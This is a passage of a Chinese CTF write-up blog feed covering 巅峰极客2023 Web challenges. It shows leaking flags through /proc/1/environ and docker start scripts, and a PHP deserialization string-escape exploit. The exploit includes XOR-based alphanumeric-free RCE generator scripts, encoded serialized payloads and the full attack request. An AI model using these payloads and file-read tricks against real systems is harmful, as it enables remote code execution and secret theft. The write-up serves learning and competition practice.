class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BabyURL&quot;&gt;&lt;a href=&quot;#BabyURL&quot; class=&quot;headerlink&quot; title=&quot;BabyURL&quot;&gt;&lt;/a&gt;BabyURL&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;审计代码得出一个思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在反序列化的时候会将得到的</summary>
      
    
    
    
    
    <category term="巅峰极客2023-Web" scheme="https://ke1nys.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-Web/"/>
    
  </entry>
  
  <entry>
    <title>java-内存马</title>
    <link href="https://ke1nys.github.io/posts/333d5c9f.html"/>
    <id>https://ke1nys.github.io/posts/333d5c9f.html</id>
    <published>2023-07-20T07:45:30.000Z</published>
    <updated>2023-08-17T09:31:50.108Z</updated>
    
